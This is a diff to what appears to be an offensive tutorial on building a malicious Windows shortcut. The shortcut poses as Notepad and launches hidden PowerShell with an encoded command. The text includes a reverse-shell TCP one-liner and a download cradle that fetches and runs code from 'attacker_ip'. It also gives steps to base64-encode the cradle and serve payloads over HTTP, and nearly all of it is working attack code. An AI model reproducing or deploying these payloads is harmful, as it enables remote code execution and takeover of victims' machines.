@@ -13,7 +13,6 @@ Follow this Step to Make a Malicious Link by Putting the Raw code..
 $WScriptShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WScriptShell.CreateShortcut("C:\Common Applications\Notepad.lnk")
 $Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-$Shortcut.Arguments = "-Nop -sta -noni -w hidden -encodedCommand <encoded_code_here>"
 ```
 # 2. Create a touch.ps1 file  and start a listener
 Create a touch.ps1 file and Edit your ip in this .....
@@ -22,8 +21,14 @@ $c=New-Object System.Net.Sockets.TCPClient("127.0.0.1",9001);$s=$c.GetStream();[
 ```
 Create a cradle and put the content in the file and start a server to serv all files.
 ```language
+#make a file and save the cradle content.
 nano cradle
 cradle content:- IEX(New-Object Net.WebClient).downloadString("http://attacker_ip:8000")
+
+#Make a encoded raw code and paste with below command.
+cat cradle | iconv -t utf-16le | base64 -w0; echo
+
+$Shortcut.Arguments = "-Nop -sta -noni -w hidden -encodedCommand <encoded_code_here>"
 ```
 ```language
 python3 -m http.server 8000
